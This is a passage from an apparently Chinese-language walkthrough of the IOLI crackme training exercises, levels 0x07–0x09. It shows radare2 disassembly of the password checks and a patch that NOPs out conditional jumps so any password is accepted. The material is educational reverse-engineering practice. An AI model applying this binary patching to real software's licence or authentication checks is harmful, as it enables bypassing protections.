|    `---&gt; <span class="number">0x080485b0</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x080485b3</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x080485b5</span>    ebc8         jmp loc<span class="number">.0804857f</span>
|     ||   ; JMP XREF from <span class="number">0x08048576</span> (fcn<span class="number">.08048524</span>)
|     ||   ; JMP XREF from <span class="number">0x08048583</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.080485</span>b7 <span class="number">2</span>
|     ``-&gt; <span class="number">0x080485b7</span>    c9           leave
\          <span class="number">0x080485b8</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; s <span class="number">0x080485db</span>
[<span class="number">0x080485db</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485db</span>]&gt; s <span class="number">0x0804860f</span>
[<span class="number">0x0804860f</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804860f</span>]&gt; s <span class="number">0x08048576</span>
[<span class="number">0x08048576</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048576</span>]&gt; s <span class="number">0x08048583</span>
[<span class="number">0x08048583</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048583</span>]&gt; s <span class="number">0x0804858d</span>
[<span class="number">0x0804858d</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804858d</span>]&gt; s <span class="number">0x08048596</span>
[<span class="number">0x08048596</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048596</span>]&gt; q
</code></pre><p>输入任意密码</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x07
IOLI Crackme Level <span class="number">0</span>x07
Password: <span class="number">12345</span>
Password OK!
</code></pre><h2 id="crackme0x08">crackme0x08</h2><pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x08
IOLI Crackme Level <span class="number">0x08</span>
Password: <span class="number">12345</span>
Password Incorrect!

 ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x08
 -- THE ONLY WINNING MOVE IS NOT TO PLAY.
[<span class="number">0x08048400</span>]&gt; aa
[<span class="number">0x08048400</span>]&gt; pdf@main 
|          ; UNKNOWN XREF from <span class="number">0x08048643</span> (unk)
|          ; DATA XREF from <span class="number">0x08048417</span> (fcn<span class="number">.080483</span>ee)
/ (fcn) sym.main <span class="number">99</span>
|          <span class="number">0x0804867d</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804867e</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048680</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048686</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048689</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804868e</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048691</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048694</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048697</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804869a</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x0804869c</span>    c70424d9870. mov dword [esp], str.IOLI_Crackme_Level_0x08_n ; str.IOLI_Crackme_Level_0x08_n
|          <span class="number">0x080486a3</span>    e810fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x080486a8</span>    c70424f2870. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x080486af</span>    e804fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x080486b4</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486b7</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486bb</span>    c70424fd870. mov dword [esp], <span class="number">0x80487fd</span> ;  <span class="number">0x080487fd</span> 
|          <span class="number">0x080486c2</span>    e8d1fcffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x080486c7</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x080486ca</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486ce</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486d1</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080486d4</span>    e8e0feffff   call sym.check
|             sym.check()
|          <span class="number">0x080486d9</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080486de</span>    c9           leave
\          <span class="number">0x080486df</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.check
|           ; UNKNOWN XREF from <span class="number">0x08048576</span> (unk)
|           ; CALL XREF from <span class="number">0x080486d4</span> (unk)
/ (fcn) sym.check <span class="number">196</span>
|           <span class="number">0x080485b9</span>    <span class="number">55</span>           push ebp
|           <span class="number">0x080485ba</span>    <span class="number">89e5</span>         mov ebp, esp
|           <span class="number">0x080485bc</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|           <span class="number">0x080485bf</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|           <span class="number">0x080485c6</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|           ; JMP XREF from <span class="number">0x08048628</span> (unk)
|- fcn<span class="number">.080485</span>cd <span class="number">176</span>
|     .---&gt; <span class="number">0x080485cd</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |     <span class="number">0x080485d0</span>    <span class="number">890424</span>       mov [esp], eax
|     |     <span class="number">0x080485d3</span>    e8d0fdffff   call sym.imp.<span class="built_in">strlen</span>
|     |        sym.imp.<span class="built_in">strlen</span>(unk)
|     |     <span class="number">0x080485d8</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|     | ,=&lt; <span class="number">0x080485db</span>    <span class="number">734</span>d         jae loc<span class="number">.0804862</span>a
|     | |   <span class="number">0x080485dd</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x080485e0</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|     | |   <span class="number">0x080485e3</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|     | |   <span class="number">0x080485e6</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|     | |   <span class="number">0x080485e9</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x080485ec</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|     | |   <span class="number">0x080485f0</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|     | |   <span class="number">0x080485f8</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|     | |   <span class="number">0x080485fb</span>    <span class="number">890424</span>       mov [esp], eax
|     | |   <span class="number">0x080485fe</span>    e8c5fdffff   call sym.imp.<span class="built_in">sscanf</span>
|     | |      sym.imp.<span class="built_in">sscanf</span>()
|     | |   <span class="number">0x08048603</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x08048606</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048609</span>    <span class="number">0110</span>         add [eax], edx
|     | |   <span class="number">0x0804860b</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|     |,==&lt; <span class="number">0x0804860f</span>    <span class="number">7512</span>         jne loc<span class="number">.08048623</span>
|     |||   <span class="number">0x08048611</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|     |||   <span class="number">0x08048614</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     |||   <span class="number">0x08048618</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |||   <span class="number">0x0804861b</span>    <span class="number">890424</span>       mov [esp], eax
|     |||   <span class="number">0x0804861e</span>    e81fffffff   call sym.parell
|     |||      sym.parell()
|     ||    ; JMP XREF from <span class="number">0x0804860f</span> (unk)
|- loc<span class="number">.08048623</span> <span class="number">90</span>
|     |`--&gt; <span class="number">0x08048623</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x08048626</span>    ff00         inc dword [eax]
|     `===&lt; <span class="number">0x08048628</span>    eba3         jmp fcn<span class="number">.080485</span>cd
|       |   ; JMP XREF from <span class="number">0x080485db</span> (unk)
|- loc<span class="number">.0804862</span>a <span class="number">83</span>
|       `-&gt; <span class="number">0x0804862a</span>    e8f5feffff   call sym.che
|       | &gt;    sym.che()
|           <span class="number">0x0804862f</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|           <span class="number">0x08048632</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|           <span class="number">0x08048636</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|           <span class="number">0x08048639</span>    <span class="number">890424</span>       mov [esp], eax
|           <span class="number">0x0804863c</span>    e873feffff   call sym.dummy
|              sym.dummy()
|           <span class="number">0x08048641</span>    <span class="number">85</span>c0         test eax, eax
|    ,====&lt; <span class="number">0x08048643</span>    <span class="number">7436</span>         je loc<span class="number">.0804867</span>b
|    |      <span class="number">0x08048645</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|    |      ; JMP XREF from <span class="number">0x08048679</span> (unk)
|- loc<span class="number">.0804864</span>c <span class="number">49</span>
|    |      <span class="number">0x0804864c</span>    <span class="number">837</span>df409     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x9</span>
|   ,=====&lt; <span class="number">0x08048650</span>    <span class="number">7f</span>29         jg loc<span class="number">.0804867</span>b
|   ||      <span class="number">0x08048652</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|   ||      <span class="number">0x08048655</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|   ||      <span class="number">0x08048658</span>    <span class="number">85</span>c0         test eax, eax
|  ,======&lt; <span class="number">0x0804865a</span>    <span class="number">7518</span>         jne loc<span class="number">.08048674</span>
|  |||      <span class="number">0x0804865c</span>    c70424d3870. mov dword [esp], str.wtf__n ; str.wtf__n
|  |||      <span class="number">0x08048663</span>    e850fdffff   call sym.imp.<span class="built_in">printf</span>
|  |||         sym.imp.<span class="built_in">printf</span>()
|  |||      <span class="number">0x08048668</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|  |||      <span class="number">0x0804866f</span>    e874fdffff   call sym.imp.<span class="built_in">exit</span>
|  |||         sym.imp.<span class="built_in">exit</span>()
|  |        ; JMP XREF from <span class="number">0x0804865a</span> (unk)
|- loc<span class="number">.08048674</span> <span class="number">9</span>
|  `------&gt; <span class="number">0x08048674</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|   ||      <span class="number">0x08048677</span>    ff00         inc dword [eax]
|   ||      <span class="number">0x08048679</span>    ebd1         jmp loc<span class="number">.0804864</span>c
|   ||      ; JMP XREF from <span class="number">0x08048643</span> (unk)
|   ||      ; JMP XREF from <span class="number">0x08048650</span> (unk)
|- loc<span class="number">.0804867</span>b <span class="number">2</span>
|   ``----&gt; <span class="number">0x0804867b</span>    c9           leave
\           <span class="number">0x0804867c</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.che
|          ; UNKNOWN XREF from <span class="number">0x08048524</span> (unk)
|          ; CALL XREF from <span class="number">0x0804862a</span> (unk)
/ (fcn) sym.che <span class="number">149</span>
|          <span class="number">0x08048524</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048525</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048527</span>    <span class="number">83</span>ec08       sub esp, <span class="number">0x8</span>
|          <span class="number">0x0804852a</span>    c70424ad870. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          <span class="number">0x08048531</span>    e882feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x08048536</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|          <span class="number">0x0804853d</span>    e8a6feffff   call sym.imp.<span class="built_in">exit</span>
|             sym.imp.<span class="built_in">exit</span>()
|          ; CALL XREF from <span class="number">0x0804861e</span> (unk)
/ (fcn) sym.parell <span class="number">119</span>
|          <span class="number">0x08048542</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048543</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048545</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x08048548</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804854b</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x0804854f</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|          <span class="number">0x08048557</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x0804855a</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804855d</span>    e866feffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x08048562</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x08048565</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048569</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804856c</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804856f</span>    e840ffffff   call sym.dummy
|             sym.dummy()
|          <span class="number">0x08048574</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x08048576</span>    <span class="number">743f</span>         je loc<span class="number">.080485</span>b7
|      |   <span class="number">0x08048578</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x080485b5</span> (unk)
|- loc<span class="number">.0804857f</span> <span class="number">58</span>
|      |   <span class="number">0x0804857f</span>    <span class="number">837</span>df809     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x08048583</span>    <span class="number">7f</span>32         jg loc<span class="number">.080485</span>b7
|     ||   <span class="number">0x08048585</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|     ||   <span class="number">0x08048588</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x0804858b</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x0804858d</span>    <span class="number">7521</span>         jne loc<span class="number">.080485</span>b0
|    |||   <span class="number">0x0804858f</span>    <span class="number">833</span>d2ca0040. cmp dword [sym.LOL], <span class="number">0x1</span>
|   ,====&lt; <span class="number">0x08048596</span>    <span class="number">750</span>c         jne loc<span class="number">.080485</span>a4
|   ||||   <span class="number">0x08048598</span>    c70424c5870. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|   ||||   <span class="number">0x0804859f</span>    e814feffff   call sym.imp.<span class="built_in">printf</span>
|   ||||      sym.imp.<span class="built_in">printf</span>()
|   |      ; JMP XREF from <span class="number">0x08048596</span> (unk)
|- loc<span class="number">.080485</span>a4 <span class="number">21</span>
|   `----&gt; <span class="number">0x080485a4</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x080485ab</span>    e838feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x0804858d</span> (unk)
|- loc<span class="number">.080485</span>b0 <span class="number">9</span>
|    `---&gt; <span class="number">0x080485b0</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x080485b3</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x080485b5</span>    ebc8         jmp loc<span class="number">.0804857f</span>
|     ||   ; JMP XREF from <span class="number">0x08048576</span> (unk)
|     ||   ; JMP XREF from <span class="number">0x08048583</span> (unk)
|- loc<span class="number">.080485</span>b7 <span class="number">2</span>
|     ``-&gt; <span class="number">0x080485b7</span>    c9           leave
\          <span class="number">0x080485b8</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; s <span class="number">0x080485db</span>
[<span class="number">0x080485db</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485db</span>]&gt; s <span class="number">0x0804860f</span>
[<span class="number">0x0804860f</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804860f</span>]&gt; s <span class="number">0x08048576</span>
[<span class="number">0x08048576</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048576</span>]&gt; s <span class="number">0x08048583</span>
[<span class="number">0x08048583</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048583</span>]&gt; s <span class="number">0x0804858d</span>
[<span class="number">0x0804858d</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804858d</span>]&gt; s <span class="number">0x08048596</span>
[<span class="number">0x08048596</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048596</span>]&gt; q

 ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x08
IOLI Crackme Level <span class="number">0x08</span>
Password: <span class="number">12345</span>
Password OK!
</code></pre><h2 id="crackme0x09">crackme0x09</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x09
IOLI Crackme Level <span class="number">0</span>x09
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p>稍微计算下。看出来<code>ebp</code>作为某个时刻的栈顶指针用来索引字符串。一番搜索在某个<code>printf</code>中发现了<code>OK</code></p>
<pre><code>✘ ⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x09
 -- Use scr.accel to browse the file faster!
[<span class="number">0x08048420</span>]&gt; aa
[<span class="number">0x08048420</span>]&gt; pdf@main
|          ; UNKNOWN XREF from <span class="number">0x080486ae</span> (fcn<span class="number">.08048616</span>)
|          ; DATA XREF from <span class="number">0x08048437</span> (entry0)
/ (fcn) main <span class="number">120</span>
|          <span class="number">0x080486ee</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x080486ef</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x080486f1</span>    <span class="number">53</span>           push ebx
|          <span class="number">0x080486f2</span>    <span class="number">81</span>ec84000000 sub esp, <span class="number">0x84</span>
|          <span class="number">0x080486f8</span>    e869000000   call fcn<span class="number">.08048766</span>
|             fcn<span class="number">.08048766</span>(unk, unk)
|          <span class="number">0x080486fd</span>    <span class="number">81</span>c3f7180000 add ebx, <span class="number">0x18f7</span>
|          <span class="number">0x08048703</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048706</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804870b</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x0804870e</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048711</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048714</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x08048717</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048719</span>    <span class="number">8</span>d8375e8ffff lea eax, [ebx-<span class="number">0x178b</span>]
|          <span class="number">0x0804871f</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048722</span>    e8b9fcffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048727</span>    <span class="number">8</span>d838ee8ffff lea eax, [ebx-<span class="number">0x1772</span>]
|          <span class="number">0x0804872d</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048730</span>    e8abfcffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048735</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x08048738</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804873c</span>    <span class="number">8</span>d8399e8ffff lea eax, [ebx-<span class="number">0x1767</span>]
|          <span class="number">0x08048742</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048745</span>    e876fcffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x0804874a</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x0804874d</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048751</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x08048754</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048757</span>    e8bafeffff   call fcn<span class="number">.08048616</span>
|             fcn<span class="number">.08048616</span>()
|          <span class="number">0x0804875c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048761</span>    <span class="number">8</span>b5dfc       mov ebx, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048764</span>    c9           leave
\          <span class="number">0x08048765</span>    c3           ret
[<span class="number">0x08048420</span>]&gt; pdf@fcn<span class="number">.08048616</span>
            ; UNKNOWN XREF from <span class="number">0x080485cb</span> (fcn<span class="number">.0804855</span>d)
            ; CALL XREF from <span class="number">0x08048757</span> (unk)
/ (fcn) fcn<span class="number">.08048616</span> <span class="number">216</span>
|           <span class="number">0x08048616</span>    <span class="number">55</span>           push ebp
|           <span class="number">0x08048617</span>    <span class="number">89e5</span>         mov ebp, esp
|           <span class="number">0x08048619</span>    <span class="number">53</span>           push ebx
|           <span class="number">0x0804861a</span>    <span class="number">83</span>ec24       sub esp, <span class="number">0x24</span>
|           <span class="number">0x0804861d</span>    e844010000   call fcn<span class="number">.08048766</span>
|              fcn<span class="number">.08048766</span>(unk, unk)
|           <span class="number">0x08048622</span>    <span class="number">81</span>c3d2190000 add ebx, <span class="number">0x19d2</span>
|           <span class="number">0x08048628</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|           <span class="number">0x0804862f</span>    c745f000000. mov dword [ebp-<span class="number">0x10</span>], <span class="number">0x0</span>
|           ; JMP XREF from <span class="number">0x08048693</span> (fcn<span class="number">.08048616</span>)
|- fcn<span class="number">.08048636</span> <span class="number">184</span>
|     .---&gt; <span class="number">0x08048636</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |     <span class="number">0x08048639</span>    <span class="number">890424</span>       mov [esp], eax
|     |     <span class="number">0x0804863c</span>    e88ffdffff   call sym.imp.<span class="built_in">strlen</span>
|     |        sym.imp.<span class="built_in">strlen</span>()
|     |     <span class="number">0x08048641</span>    <span class="number">3945f</span>0       cmp [ebp-<span class="number">0x10</span>], eax
|     | ,=&lt; <span class="number">0x08048644</span>    <span class="number">734f</span>         jae loc<span class="number">.08048695</span>
|     | |   <span class="number">0x08048646</span>    <span class="number">8</span>b45f0       mov eax, [ebp-<span class="number">0x10</span>]
|     | |   <span class="number">0x08048649</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|     | |   <span class="number">0x0804864c</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|     | |   <span class="number">0x0804864f</span>    <span class="number">8845</span>ef       mov [ebp-<span class="number">0x11</span>], al
|     | |   <span class="number">0x08048652</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048655</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|     | |   <span class="number">0x08048659</span>    <span class="number">8</span>d835ee8ffff lea eax, [ebx-<span class="number">0x17a2</span>]
|     | |   <span class="number">0x0804865f</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     | |   <span class="number">0x08048663</span>    <span class="number">8</span>d45ef       lea eax, [ebp-<span class="number">0x11</span>]
|     | |   <span class="number">0x08048666</span>    <span class="number">890424</span>       mov [esp], eax
|     | |   <span class="number">0x08048669</span>    e882fdffff   call sym.imp.<span class="built_in">sscanf</span>
|     | |      sym.imp.<span class="built_in">sscanf</span>()
|     | |   <span class="number">0x0804866e</span>    <span class="number">8</span>b55f8       mov edx, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048671</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x08048674</span>    <span class="number">0110</span>         add [eax], edx
|     | |   <span class="number">0x08048676</span>    <span class="number">837</span>df410     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x10</span>
|     |,==&lt; <span class="number">0x0804867a</span>    <span class="number">7512</span>         jne loc<span class="number">.0804868</span>e
|     |||   <span class="number">0x0804867c</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|     |||   <span class="number">0x0804867f</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     |||   <span class="number">0x08048683</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |||   <span class="number">0x08048686</span>    <span class="number">890424</span>       mov [esp], eax
|     |||   <span class="number">0x08048689</span>    e8fbfeffff   call fcn<span class="number">.08048589</span>
|     |||      fcn<span class="number">.08048589</span>()
|     ||    ; JMP XREF from <span class="number">0x0804867a</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.0804868</span>e <span class="number">96</span>
|     |`--&gt; <span class="number">0x0804868e</span>    <span class="number">8</span>d45f0       lea eax, [ebp-<span class="number">0x10</span>]
|     | |   <span class="number">0x08048691</span>    ff00         inc dword [eax]
|     `===&lt; <span class="number">0x08048693</span>    eba1         jmp fcn<span class="number">.08048636</span>
|       |   ; JMP XREF from <span class="number">0x08048644</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.08048695</span> <span class="number">89</span>
|       `-&gt; <span class="number">0x08048695</span>    e8c3feffff   call fcn<span class="number">.0804855</span>d
|       | &gt;    fcn<span class="number">.0804855</span>d()
|           <span class="number">0x0804869a</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|           <span class="number">0x0804869d</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|           <span class="number">0x080486a1</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|           <span class="number">0x080486a4</span>    <span class="number">890424</span>       mov [esp], eax
|           <span class="number">0x080486a7</span>    e828feffff   call fcn<span class="number">.080484</span>d4
|              fcn<span class="number">.080484</span>d4() ; entry0+<span class="number">180</span>
|           <span class="number">0x080486ac</span>    <span class="number">85</span>c0         test eax, eax
|    ,====&lt; <span class="number">0x080486ae</span>    <span class="number">7438</span>         je loc<span class="number">.080486e8</span>
|    |      <span class="number">0x080486b0</span>    c745f000000. mov dword [ebp-<span class="number">0x10</span>], <span class="number">0x0</span>
|    |      ; JMP XREF from <span class="number">0x080486e6</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.080486</span>b7 <span class="number">55</span>
|    |      <span class="number">0x080486b7</span>    <span class="number">837</span>df009     cmp dword [ebp-<span class="number">0x10</span>], <span class="number">0x9</span>
|   ,=====&lt; <span class="number">0x080486bb</span>    <span class="number">7f</span>2b         jg loc<span class="number">.080486e8</span>
|   ||      <span class="number">0x080486bd</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|   ||      <span class="number">0x080486c0</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|   ||      <span class="number">0x080486c3</span>    <span class="number">85</span>c0         test eax, eax
|  ,======&lt; <span class="number">0x080486c5</span>    <span class="number">751</span>a         jne loc<span class="number">.080486e1</span>
|  |||      <span class="number">0x080486c7</span>    <span class="number">8</span>d836fe8ffff lea eax, [ebx-<span class="number">0x1791</span>]
|  |||      <span class="number">0x080486cd</span>    <span class="number">890424</span>       mov [esp], eax
|  |||      <span class="number">0x080486d0</span>    e80bfdffff   call sym.imp.<span class="built_in">printf</span>
|  |||         sym.imp.<span class="built_in">printf</span>()
|  |||      <span class="number">0x080486d5</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|  |||      <span class="number">0x080486dc</span>    e82ffdffff   call sym.imp.<span class="built_in">exit</span>
|  |||         sym.imp.<span class="built_in">exit</span>()
